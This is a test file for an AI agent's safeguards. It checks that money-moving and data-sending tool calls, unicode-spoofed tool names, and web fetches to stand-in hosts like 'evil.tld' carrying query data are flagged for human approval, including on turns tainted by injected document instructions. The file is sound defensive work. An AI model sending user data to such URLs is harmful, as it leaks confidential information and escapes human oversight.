import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { classifyProtected } from '@/lib/protected-actions';
import { isApprovalMessage } from '@/lib/approval-handler';

vi.mock('@/lib/model-router/dispatch', () => ({
  admittedCall: async (_scope: unknown, run: () => Promise<unknown>) => run(),
  admittedChatOnce: async (_scope: unknown, opts: unknown) => {
    const { chatOnce } = await import('@/lib/model-router');
    return chatOnce(opts as never);
  },
  reserveDispatch: async () => ({ id: 'test', attemptKey: 'k0000001', userId: 'u1', reservedTokens: 1, reservedMicros: 0 }),
  settleDispatch: async () => undefined,
  holdDispatch: async () => undefined,
  releaseDispatch: async () => undefined,
  runAdmittedVoice: async (_i: unknown, run: () => Promise<unknown>) => run(),
  DispatchBlockedError: class extends Error {},
}));


const cls = (toolName: string, extra: { description?: string; params?: unknown; tainted?: boolean } = {}) =>
  classifyProtected({ toolName, capability: toolName, ...extra });

describe('action words win over read words (M1)', () => {
  it.each([
    'openclaw__stripe__get_and_capture_payment',
    'openclaw__alpaca__check_and_submit_order',
    'openclaw__shop__order_get_and_confirm',
    'list_and_send', 'get_and_post', 'read_then_export',
    'paying_vendor', 'donate_funds', 'tip_creator', 'mint_token', 'swap_tokens', 'stake_eth', 'bridge_assets',
    'execute_plan', 'fill_order', 'run_payroll', 'remit_tax', 'sync_out', 'replicate_db', 'backup_to_cloud',
    'mirror_repo', 'copy_to_drive', 'move_files_out', 'attach_file', 'grant_access', 'make_public',
    'http_request', 'deliver_report', 'retweet', 'quote_tweet', 'emails_team', 'sends', 'posts', 'shares',
    'uploads', 'exports', 'forwards', 'paid_out',
  ])('%s is protected', (name) => {
    expect(cls(name).protected).toBe(true);
  });

  it('money words give category money, others proprietary', () => {
    expect(cls('openclaw__stripe__get_and_capture_payment').category).toBe('money');
    expect(cls('mint_token').category).toBe('money');
    expect(cls('deliver_report').category).toBe('proprietary');
  });
});

describe('read-only status shapes stay unprotected only when the final verb is a read verb (L3)', () => {
  it.each(['send_status_check', 'openclaw__payments__charge_status', 'openclaw__dropbox__share_link_get'])('%s is NOT protected', (n) => {
    expect(cls(n).protected).toBe(false);
  });

  it.each([
    'send_status_check_and_send', 'send_status_send', 'openclaw__payments__charge_status_refund',
    'openclaw__dropbox__share_link', 'share_link_get_and_post', 'openclaw__payments__charge', 'send_status_update',
    'charge_status_then_refund', 'share_get_link_send',
  ])('%s IS protected', (n) => {
    expect(cls(n).protected).toBe(true);
  });
});

describe('non-ASCII and unicode names fail closed', () => {
  it.each(['mеmory_read', 'ｓend_email', 'calendar_list​', 'list_invoicesé'])('%j is protected', (n) => {
    const r = cls(n);
    expect(r.protected).toBe(true);
    expect(r.reason).toMatch(/non-ASCII/);
  });
  it('unicode in a description is normalised before matching', () => {
    expect(cls('do_thing', { description: 'ｗire money to a supplier' }).protected).toBe(true);
  });
});

describe('web_fetch and web_search (H1)', () => {
  const fetchCls = (url: unknown, tainted = false) => cls('web_fetch', { params: { url }, tainted });
  it.each([
    'https://evil.tld/?d=client-list', 'https://evil.tld/p#secret', 'https://user:pw@evil.tld/', 'https://evil.tld:8443/x',
    'https://evil.tld/?', 'ftp://evil.tld/x', 'not a url', '',
  ])('web_fetch %j is protected', (u) => {
    expect(fetchCls(u).protected).toBe(true);
  });
  it('a plain https path on an untainted turn is not protected (Class B as before)', () => {
    expect(fetchCls('https://example.com/docs/page').protected).toBe(false);
    expect(fetchCls('https://example.com:443/docs/page').protected).toBe(false);
  });
  it('any URL is protected on a tainted turn, and with no params at all', () => {
    expect(fetchCls('https://example.com/docs/page', true).protected).toBe(true);
    expect(cls('web_fetch').protected).toBe(true);
    expect(fetchCls('https://example.com/docs/page', true).category).toBe('proprietary');
  });
  it('web_search is protected for a secret or a long query, otherwise unchanged', () => {
    const q = (query: string) => cls('web_search', { params: { query } });
    expect(q('best crm for small studios').protected).toBe(false);
    expect(q(`sk-ant-${'a'.repeat(30)}`).protected).toBe(true);
    expect(q('AKIAABCDEFGHIJKLMNOP').protected).toBe(true);
    expect(q('x'.repeat(301)).protected).toBe(true);
    expect(q('x'.repeat(300)).protected).toBe(false);
  });
  it('a host on config/web-fetch-hosts.json may carry a query, but never on a tainted turn or with user info', async () => {
    vi.resetModules();
    vi.doMock('@/config/web-fetch-hosts.json', () => ({ default: ['api.example.com'] }));
    const m = await import('@/lib/protected-actions');
    const f = (url: string, tainted = false) => m.classifyProtected({ toolName: 'web_fetch', params: { url }, tainted }).protected;
    expect(f('https://api.example.com/v1?q=1')).toBe(false);
    expect(f('https://API.example.com/v1?q=1')).toBe(false);
    expect(f('https://other.example.com/v1?q=1')).toBe(true);
    expect(f('https://api.example.com/v1?q=1', true)).toBe(true);
    expect(f('https://u:p@api.example.com/v1')).toBe(true);
    vi.doUnmock('@/config/web-fetch-hosts.json');
  });
  it('the shipped allow-list is empty', async () => {
    const list = (await import('@/config/web-fetch-hosts.json')).default;
    expect(list).toEqual([]);
  });
});

describe('executeTool: a document that says fetch a URL with data needs approval on the first call', () => {
  const fetchSpy = vi.fn();
  async function load() {
    vi.resetModules();
    process.env.OPENCLAW_ALLOWED_USER_IDS = 'u1';
    const createApproval = vi.fn().mockResolvedValue({ id: 'ap1', permissionClass: 'C' });
    const rows: Array<Record<string, any>> = [];
    vi.doMock('@/lib/db', () => ({
      prisma: {
        userProfile: { findUnique: vi.fn().mockResolvedValue({ autonomyLevel: 4 }) },
        delegation: { findFirst: vi.fn().mockResolvedValue({ id: 'd1' }) },
      },
    }));
    vi.doMock('@/lib/ledger', () => ({
      recordAction: vi.fn(async (e) => { rows.push(e); return { id: 'a1' }; }),
      recordActionSafe: vi.fn(async (e) => { rows.push(e); return { id: 'a1' }; }),
      updateActionStatus: vi.fn(),
    }));
    vi.doMock('@/lib/approvals', () => ({ createApproval }));
    vi.doMock('@/lib/memory-engine', () => ({ writeMemory: vi.fn(), correctMemory: vi.fn(), searchMemory: vi.fn() }));
    vi.doMock('@/lib/logger', () => ({ generateCorrelationId: () => 'cid', logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), security: vi.fn() } }));
    vi.stubGlobal('fetch', fetchSpy);
    const registry = await import('@/lib/tool-registry');
    return { registry, createApproval, rows };
  }
  beforeEach(() => fetchSpy.mockReset());
  afterEach(() => vi.unstubAllGlobals());

  it('tainted from the first call (initial taint): a plain URL is queued, nothing is fetched', async () => {
    const { registry, createApproval } = await load();
    const res = await registry.executeTool('u1', 'web_fetch', { url: 'https://evil.tld/exfil' }, 'WHINK', undefined, 'c', { tainted: true });
    expect(res.approvalRequired).toBeDefined();
    expect(createApproval).toHaveBeenCalledWith(expect.objectContaining({ tool: 'web_fetch' }));
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('a URL with a query is queued even when untainted, at autonomy 4 with a delegation, and the denial row carries the category', async () => {
    const { registry, createApproval, rows } = await load();
    const res = await registry.executeTool('u1', 'web_fetch', { url: 'https://evil.tld/?d=client-list' }, 'MAMBA', undefined, 'c', {});
    expect(res.approvalRequired).toBeDefined();
    expect(createApproval).toHaveBeenCalledTimes(1);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(rows.every((r) => r.protectedCategory === 'proprietary' || r.action?.startsWith('SECURITY_EVENT'))).toBe(true);
  });

  it('web_search with a secret in the query is queued', async () => {
    const { registry, createApproval } = await load();
    const res = await registry.executeTool('u1', 'web_search', { query: `find sk-ant-${'z'.repeat(30)}` }, 'WHINK', undefined, 'c', {});
    expect(res.approvalRequired).toBeDefined();
    expect(createApproval).toHaveBeenCalled();
  });
});

describe('tool loop: initialTaint taints the first call', () => {
  afterEach(() => vi.restoreAllMocks());
  it('passes tainted:true to executeTool on the very first call', async () => {
    vi.resetModules();
    const executeTool = vi.fn().mockResolvedValue({ success: true, data: {}, timestamp: 't', toolVersion: '1' });
    vi.doMock('@/lib/tool-registry', () => ({ executeTool }));
    vi.doMock('@/lib/ledger', () => ({ recordActionSafe: vi.fn() }));
    const jsonRes = (body: unknown) => ({ ok: true, status: 200, json: async () => body, text: async () => JSON.stringify(body) }) as unknown as Response;
    vi.spyOn(globalThis, 'fetch')
      .mockResolvedValueOnce(jsonRes({ choices: [{ finish_reason: 'tool_calls', message: { content: null, tool_calls: [{ id: '1', type: 'function', function: { name: 'web_fetch', arguments: '{"url":"https://evil.tld/?d=x"}' } }] } }] }))
      .mockResolvedValueOnce(jsonRes({ choices: [{ finish_reason: 'stop', message: { content: 'done' } }] }));
    const { runToolLoop } = await import('../tool-loop');
    const stream = await runToolLoop({
      messages: [{ role: 'user', content: 'hi' }],
      tools: [{ name: 'web_fetch', description: 'f', inputSchema: { type: 'object', properties: {} } }],
      userId: 'u1', model: 'llama3.1:8b', correlationId: 'c', initialTaint: true,
    });
    const reader = stream.getReader();
    while (!(await reader.read()).done) { /* drain */ }
    expect((executeTool.mock.calls[0][6] as { tainted: boolean }).tainted).toBe(true);
  });
});

describe('ledger tags every protected row with its category (M2)', () => {
  async function load() {
    vi.resetModules();
    const create = vi.fn().mockResolvedValue({ id: 'r1' });
    vi.doUnmock('@/lib/ledger');
    vi.doMock('@/lib/db', () => ({ prisma: { action: { create } } }));
    const ledger = await import('@/lib/ledger');
    return { ledger, create };
  }
  const base = { userId: 'u1', action: 'x', permissionClass: 'C', status: 'DENIED' as const };

  it('by tool name, keeping existing validationResult text', async () => {
    const { ledger, create } = await load();
    await ledger.recordAction({ ...base, tool: 'sms_briefing_send', validationResult: 'requires_confirmation' });
    expect(JSON.parse(create.mock.calls[0][0].data.validationResult)).toEqual({ detail: 'requires_confirmation', protected: true, category: 'proprietary' });
    await ledger.recordAction({ ...base, tool: 'stripe_refund', validationResult: JSON.stringify({ approvalId: 'a' }) });
    expect(JSON.parse(create.mock.calls[1][0].data.validationResult)).toEqual({ approvalId: 'a', protected: true, category: 'money' });
  });
  it('by the category the caller computed from parameters', async () => {
    const { ledger, create } = await load();
    await ledger.recordAction({ ...base, tool: 'do_thing', protectedCategory: 'money' });
    expect(JSON.parse(create.mock.calls[0][0].data.validationResult)).toEqual({ protected: true, category: 'money' });
  });
  it('leaves unprotected rows untouched', async () => {
    const { ledger, create } = await load();
    await ledger.recordAction({ ...base, tool: 'memory_read', validationResult: 'auto' });
    expect(create.mock.calls[0][0].data.validationResult).toBe('auto');
    await ledger.recordAction({ ...base, tool: 'memory_read' });
    expect(create.mock.calls[1][0].data.validationResult).toBeUndefined();
  });
});

describe('approval views and ledger use parameters, EARs and scheduled posts (M2)', () => {
  let rows: any[]; let ledgerRows: any[];
  async function load() {
    vi.resetModules();
    rows = []; ledgerRows = [];
    vi.doUnmock('@/lib/approvals');
    vi.doMock('@/lib/db', () => ({
      prisma: {
        approvalRequest: {
          create: async ({ data }: any) => { const r = { ...data, id: `ap${rows.length + 1}`, decidedAt: null, executedAt: null }; rows.push(r); return { ...r }; },
          findFirst: async () => null, findMany: async () => [], updateMany: async () => ({ count: 0 }), deleteMany: async () => ({ count: 1 }),
        },
      },
    }));
    vi.doMock('@/lib/ledger', () => ({
      recordAction: async (e: any) => { ledgerRows.push(e); return { id: 'l' }; },
      recordActionSafe: async (e: any) => { ledgerRows.push(e); return { id: 'l' }; },
    }));
    return import('@/lib/approvals');
  }
  it('an unknown tool whose parameters carry an amount is marked money; a recipient is proprietary', async () => {
    const { createApproval } = await load();
    const a = await createApproval({ userId: 'u1', kind: 'tool_call', tool: 'do_thing', params: { amount: 5000, currency: 'CAD' }, correlationId: 'c' });
    expect(a).toMatchObject({ protected: true, category: 'money' });
    expect(ledgerRows[0].protectedCategory).toBe('money');
    const b = await createApproval({ userId: 'u1', kind: 'tool_call', tool: 'do_thing', params: { to: 'a@b.c', url: 'https://x.y' }, correlationId: 'c' });
    expect(b).toMatchObject({ protected: true, category: 'proprietary' });
  });
  it('an EAR about paying someone is marked money; a scheduled post is proprietary', async () => {
    const { createApproval } = await load();
    const ear = await createApproval({ userId: 'u1', kind: 'ear', params: { objective: 'Wire money to the supplier' }, correlationId: 'c' });
    expect(ear).toMatchObject({ protected: true, category: 'money' });
    const plain = await createApproval({ userId: 'u1', kind: 'ear', params: { objective: 'Draft the weekly plan' }, correlationId: 'c' });
    expect(plain.protected).toBe(false);
    const sched = await createApproval({ userId: 'u1', kind: 'scheduled_post', params: { platform: 'x', send_at: 't', args: { text: 'hi' } }, correlationId: 'c' });
    expect(sched).toMatchObject({ protected: true, category: 'proprietary' });
  });
});

describe('spoken approval needs the server confirmation code (L1)', () => {
  const T0 = new Date('2026-10-25T12:00:00.000Z');
  let rows: any[]; let ledgerRows: any[];
  async function load(secret: string | null = 'a-long-enough-secret-value') {
    vi.resetModules();
    delete process.env.AUTH_SECRET; delete process.env.NEXTAUTH_SECRET;
    if (secret) process.env.APPROVAL_CODE_SECRET = secret; else delete process.env.APPROVAL_CODE_SECRET;
    rows = []; ledgerRows = [];
    vi.doUnmock('@/lib/approvals');
    const match = (r: any, w: any) => (w.id === undefined || r.id === w.id) && (w.userId === undefined || r.userId === w.userId) && (w.status === undefined || r.status === w.status)
      && (!w.expiresAt?.gt || r.expiresAt > w.expiresAt.gt) && (!w.expiresAt?.lte || r.expiresAt <= w.expiresAt.lte);
    vi.doMock('@/lib/db', () => ({
      prisma: {
        approvalRequest: {
          create: async ({ data }: any) => { const r = { ...data, id: `ap${rows.length + 1}`, decidedAt: null, executedAt: null }; rows.push(r); return { ...r }; },
          findFirst: async ({ where }: any) => { const r = rows.find((x) => match(x, where)); return r ? { ...r } : null; },
          findMany: async ({ where }: any) => rows.filter((x) => match(x, where)).map((x) => ({ ...x })),
          updateMany: async ({ where, data }: any) => { let count = 0; for (const r of rows) if (match(r, where)) { Object.assign(r, data); count++; } return { count }; },
          deleteMany: async () => ({ count: 1 }),
        },
      },
    }));
    vi.doMock('@/lib/ledger', () => ({
      recordAction: async (e: any) => { ledgerRows.push(e); return { id: 'l' }; },
      recordActionSafe: async (e: any) => { ledgerRows.push(e); return { id: 'l' }; },
    }));
    // This unit suite exercises confirmation codes, not queue persistence (covered by the M1 DB suite).
    const enqueue = vi.fn().mockResolvedValue({ executionId: 'unit-queue-receipt', status: 'QUEUED' });
    vi.doMock('@/lib/worker/ear-execution', () => ({ enqueueApprovedEar: enqueue }));
    const approvals = await import('@/lib/approvals');
    const code = await import('@/lib/approval-code');
    return { approvals, code, enqueue };
  }
  const mk = (approvals: any) => approvals.createApproval({ userId: 'u1', kind: 'ear', params: { objective: 'Draft the weekly plan', lead_agent: 'A', supporting_agents: [], team_size: 1, capability_gaps: [] }, correlationId: 'c', now: () => T0 });
  const at = (ms: number) => () => new Date(T0.getTime() + ms);

  beforeEach(() => { vi.useFakeTimers({ toFake: ['Date'] }); vi.setSystemTime(T0); });
  afterEach(() => { vi.useRealTimers(); delete process.env.APPROVAL_CODE_SECRET; });

  it('the code is 4 digits, per request, and shown on the owner view only', async () => {
    const { approvals } = await load();
    const a = await mk(approvals); const b = await mk(approvals);
    expect(a.confirmationCode).toMatch(/^\d{4}$/);
    expect(b.confirmationCode).toMatch(/^\d{4}$/);
  });

  it('wrong, missing or malformed code: nothing approved, request stays pending, security event ledgered', async () => {
    const { approvals } = await load();
    const a = await mk(approvals);
    for (const code of [undefined, '', '0000x', 1234, a.confirmationCode === '1111' ? '2222' : '1111']) {
      const out = await approvals.decide('u1', a.id, 'approve', { now: at(1000), voice: { code } });
      expect(out.status).toBe('CODE_REJECTED');
    }
    expect(rows[0].status).toBe('PENDING');
    expect(ledgerRows.some((l) => l.action === 'SECURITY_EVENT: voice_approval_code_rejected')).toBe(true);
  });

  it('the right code approves once; a card click needs no code', async () => {
    const { approvals, enqueue } = await load();
    const a = await mk(approvals);
    const ok = await approvals.decide('u1', a.id, 'approve', { now: at(1000), voice: { code: a.confirmationCode } });
    expect(ok.status).toBe('EXECUTED');
    expect((await approvals.decide('u1', a.id, 'approve', { now: at(1000), voice: { code: a.confirmationCode } })).status).toBe('ALREADY_DECIDED');
    const b = await mk(approvals);
    expect((await approvals.decide('u1', b.id, 'approve', { now: at(1000) })).status).toBe('EXECUTED');
    expect(enqueue).toHaveBeenCalledTimes(2);
  });

  it('another user\'s id with any code is not found; no secret configured means voice approval is refused', async () => {
    const { approvals } = await load();
    const a = await mk(approvals);
    expect((await approvals.decide('u2', a.id, 'approve', { now: at(1000), voice: { code: a.confirmationCode } })).status).toBe('NOT_FOUND');
    const none = await load(null);
    const b = await mk(none.approvals);
    expect(b.confirmationCode).toBeNull();
    expect((await none.approvals.decide('u1', b.id, 'approve', { now: at(1000), voice: { code: '0000' } })).status).toBe('CODE_REJECTED');
  });

  it('the code binds the approval id, content and user', async () => {
    const { code } = await load();
    const c1 = code.approvalConfirmationCode('u1', 'ap1', 'h1');
    expect(c1).toMatch(/^\d{4}$/);
    const others = [code.approvalConfirmationCode('u1', 'ap2', 'h1'), code.approvalConfirmationCode('u1', 'ap1', 'h2'), code.approvalConfirmationCode('u2', 'ap1', 'h1')];
    expect(others.some((o) => o !== c1)).toBe(true);
    expect(code.approvalConfirmationCode('u1', 'ap1', 'h1')).toBe(c1);
  });
});

describe('decision route: voice shape (L1)', () => {
  const auth = vi.fn(); const decide = vi.fn();
  beforeEach(() => {
    vi.resetModules();
    auth.mockReset().mockResolvedValue({ user: { id: 'u1' } });
    decide.mockReset().mockResolvedValue({ id: 'ap1', status: 'EXECUTED', result: null });
    vi.doMock('next/server', () => ({
      NextRequest: class {},
      NextResponse: { json: (b: unknown, init?: { status?: number }) => new Response(JSON.stringify(b), { status: init?.status ?? 200 }) },
    }));
    vi.doMock('@/auth', () => ({ auth }));
    vi.doMock('@/lib/approvals', () => ({ decide, listPending: vi.fn() }));
  });
  const post = async (body: unknown) => {
    const { POST } = await import('../../app/api/approvals/[id]/decision/route');
    return POST({ headers: new Headers({ 'content-type': 'application/json' }), json: async () => body } as never, { params: Promise.resolve({ id: 'ap1' }) });
  };

  it('a voice approve passes the code to decide; a card click passes none', async () => {
    expect((await post({ decision: 'approve', via: 'voice', code: '1234' })).status).toBe(200);
    expect(decide).toHaveBeenLastCalledWith('u1', 'ap1', 'approve', { voice: { code: '1234' } });
    await post({ decision: 'approve' });
    expect(decide).toHaveBeenLastCalledWith('u1', 'ap1', 'approve');
    await post({ decision: 'deny', via: 'voice' });
    expect(decide).toHaveBeenLastCalledWith('u1', 'ap1', 'deny');
  });
  it('a voice approve with no code reaches decide with an undefined code and a rejection is a 403', async () => {
    decide.mockResolvedValue({ id: 'ap1', status: 'CODE_REJECTED', result: null });
    const res = await post({ decision: 'approve', via: 'voice' });
    expect(decide).toHaveBeenLastCalledWith('u1', 'ap1', 'approve', { voice: { code: undefined } });
    expect(res.status).toBe(403);
  });
  it('code without voice, unknown via values and extra keys are 400', async () => {
    for (const body of [{ decision: 'approve', code: '1234' }, { decision: 'approve', via: 'card' }, { decision: 'approve', via: 'voice', code: '1', all: true }]) {
      expect((await post(body)).status).toBe(400);
    }
    expect(decide).not.toHaveBeenCalled();
  });
});

describe('bulk approval phrases (L5)', () => {
  it.each(['yes to all', 'Yes to all.', 'approve both', 'approve everything', 'approve them all', 'yes, both', 'ok everything'])('%s approves nothing', (m) => {
    expect(isApprovalMessage(m)).toBe(true);
  });
  it.each(['yes all good with the plan', 'what is on my calendar', 'both options look fine to me'])('%s is ordinary chat', (m) => {
    expect(isApprovalMessage(m)).toBe(false);
  });
});
